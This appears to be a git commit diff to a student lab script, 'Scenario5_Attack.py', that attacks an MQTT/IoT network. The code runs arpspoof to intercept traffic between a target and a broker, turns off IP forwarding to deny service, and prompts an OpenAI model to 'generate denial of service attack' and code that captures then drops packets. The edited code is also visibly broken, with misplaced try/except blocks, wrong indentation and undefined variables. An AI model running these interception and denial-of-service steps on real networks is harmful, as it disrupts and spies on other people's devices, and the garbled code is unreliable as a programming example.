1b1d33a0c49f066c9956bcc833aa32312b2f92bc
Trenton Watkins <watkinstw26@mail.vmi.edu>
2024-10-14 10:24:22 -0400

    Update Scenario5_Attack.py

--- AI_code/Scenario5_Attack.py
+++ AI_code/Scenario5_Attack.py
@@ -21,11 +21,11 @@ sniffed_topic = ""
 sniffed_message = ""
 desired_payload = None
 stop_flag = False
- 
+
 rec = False
 
 def on_connect(client, userdata, flags, rc):
-    print("connected")    
+    print("connected")
 def on_message(client, userdata, msg):
     
     global rec
@@ -47,7 +47,7 @@ def mqtt_payload_parser(payload):
         message = payload[4+topic_len:].decode()  # Extract message
         return topic, message
     except Exception as e:
-        return None, None       
+        return None, None
                 
 '''
 denial_of_service() - Method responsible for performing the denial of service attack.
@@ -56,28 +56,71 @@ def denial_of_service():
     try:
         print("Performing Denial of Serivce Attack....")
         #TODO: Have AI generate this command
-        os.system("sudo sysctl -w net.ipv4.ip_forward=0") 
-        #TODO: Have AI generate this command
+        openai.api_key
+        prompt = "Generate denial of service attack for " + targetIP
+    # Function to send a message to ChatGPT
+        def send_message_to_gpt(prompt):
+            response = openai.ChatCompletion.create(model=llm_model,messages=[{"role": "user", "content": prompt}])
+
+    finally:
+        return response['choices'][0]['message']['content']
+
+    
+os.system("sudo sysctl -w net.ipv4.ip_forward=0")
         #Reroutes packets from the MQTT server through this computer.
-        nodeAttack = subprocess.Popen(["sudo", "arpspoof", "-i", "eth0", "-t", targetIP, brokerIP], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-        while True:
+nodeAttack = subprocess.Popen(["sudo", "arpspoof", "-i", "eth0", "-t", targetIP, brokerIP], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+while True:
+    #TODO: Have AI generate this command.
+    
+    prompt = "generate a code that stores all data from these pactets then drops them "
+    response = openai.ChatCompletion.create(model=llm_model,messages=[{"role": "user", "content": prompt}])
+            #Reroutes packets from the MQTT server through this computer.
+    nodeAttack = subprocess.Popen(["sudo", "arpspoof", "-i", "eth0", "-t", targetIP, brokerIP], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    while True:
             time.sleep(5)
     #Kills the program when desired.
     except KeyboardInterrupt:
-        print("Stopping DDOS process...")
-        os.kill(nodeAttack.pid, signal.SIGTERM)
+    print("Stopping DDOS process...")
+    os.kill(nodeAttack.pid, signal.SIGTERM)
 
 #TODO: Create a command that sends relevant attack information to the XR AI agent (Trenton).
 
 try:
     while True: 
-        #lang_classification()
-            #response = lang_classification()
-            #json_string = '{"attack_class_fdt": true, "attack_class_dos": false, "attack_class_phsh": false}'
-            #response = json.loads(json_string)
-        #fake_data_transfer_attack()
-        denial_of_service()
-        break
+        lang_classification()
+        #Classifies the responcs in an array
+        response = lang_classification()
+        
+        # looks through the array to find the type of attack opens API key and returns message generated
+        if x in response is true:
+            attack_type = x
+            API_KEY
+            response = openai.ChatCompletion.create(model=llm_model, messages=[{"role": "user", "content": "Generate information about " + attack_type + " attacks"}])['choices'][0]['message']['content']
+finally:
+#publish to a broker topic the the VR to pull and print message from
+    client.on_connect = on_connect
+
+# Connect to the broker
+    client.connect(brokerIP, broker_port, 60)
+
+# Start the loop to process network traffic and dispatch callbacks
+    client.loop_start()
+
+# Publish data to the broker
+
+    client.publish(attack_info, response)
+
+# Stop the loop after publishing
+    client.loop_stop()
+
+# Disconnect from the broker
+    client.disconnect()
+    fake_data_transfer_attack()
+#denial_of_service()
+
+
+except KeyboardInterrupt:
+    print("Stopping Attack....")
 
 except KeyboardInterrupt:
     print("Stopping Attack....")
